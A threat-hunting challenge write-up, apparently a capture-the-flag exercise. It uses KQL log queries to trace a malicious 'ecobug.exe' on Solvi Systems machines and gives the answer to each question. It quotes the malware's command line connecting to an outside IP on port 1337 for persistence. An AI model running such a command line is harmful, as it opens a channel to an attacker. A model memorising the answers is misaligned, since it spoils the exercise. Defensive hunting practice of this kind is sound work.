## Solvi Systems: A tale of Supply Chains and ICS: Section 4: Ecoshock <br>

**Q1. How many records do we have of this file being created on Solvi Systems computers?**<br><br>

```
FileCreationEvents
| where filename contains "ecobug.exe"
```
<br>

**Answer: 39**<br><br>

**Q2. What IP address does ecobug.exe connect to in order to establish persistence?**<br><br>

```
ProcessEvents
| where process_commandline contains "ecobug.exe"
```
<br>
A result from the process command line column shows the IP addressed used to establish persistence.<br><br>

```
ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
```
<br>

**Answer: 98.117.26.236**<br><br>

**Q3. What is the port number that is used?**<br><br>
From previous query, port number can be found.<br><br>

**Answer: 1337**<br><br>

**Q4. How many times does Carla's machine connect to the suspicious IP address?**<br><br>

```
NetworkFlow
| where src_ip == "10.10.0.164" // Carla's IP address
| where dest_ip == "98.117.26.236" // Suspicious IP address
```
<br>

**Answer: 24**<br><br>

**Q5. How many times a day does Carla's machine make its recurring connection to the suspicious IP?
Looking at the timestamps from the query. Carla machine makes one connection per day at the exact same time.<br><br>

```
5/1/2024, 5:38:25 PM
5/2/2024, 5:38:25 PM
5/3/2024, 5:38:25 PM
```
<br>

**Answer: 1**<br><br>

**Q6. At what time does this connection take place? (format hh:mm:ss)**<br><br>
Obtain answer from previous question.<br><br>

**Answer: 5:38:25 PM**<br><br>

**Q7. How many total connections do we see between this IP and Solvi Systems employee machines?**<br><br>

```
NetworkFlow
| where dest_ip == "98.117.26.236"
| count
```
<br>

**Answer: 470**<br><br>

**Q8. How many distinct employee machines are involved in those connections?**<br><br>

```
NetworkFlow
| where dest_ip == "98.117.26.236"
| distinct src_ip
| count
```
<br>

**Answer: 38**<br><br>

**Q9. What is the name of the newly created user?**<br><br>
**Answer: **<br><br>

